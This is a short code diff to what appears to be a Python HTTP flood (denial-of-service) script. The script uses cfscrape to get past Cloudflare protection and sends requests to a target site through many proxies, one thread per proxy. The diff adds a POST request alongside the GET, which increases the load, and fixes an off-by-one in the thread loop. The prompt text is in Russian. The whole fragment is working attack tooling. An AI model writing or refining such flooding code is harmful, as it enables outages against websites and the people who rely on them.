@@ -6,6 +6,7 @@ def attack(proxy, scraper):
         try:
             proxies = {"http": f'http://{proxy}', "https": f'http://{proxy}'}
             scraper.get(site, proxies=proxies)
+            scraper.post(site, proxies=proxies)
         except:
             pass
 
@@ -16,6 +17,6 @@ if "__main__" == __name__:
     colprox = int(input(f'Сколько прокси использовать из {len(proxy_base)}: '))
 
     scraper = cfscrape.create_scraper()
-    for x in range(colprox+1):
+    for x in range(colprox):
         Thread(target=attack, args=(proxy_base[x],scraper,)).start()
         print(f'\r\rStarted thread {x}/{len(proxy_base)}', end='')
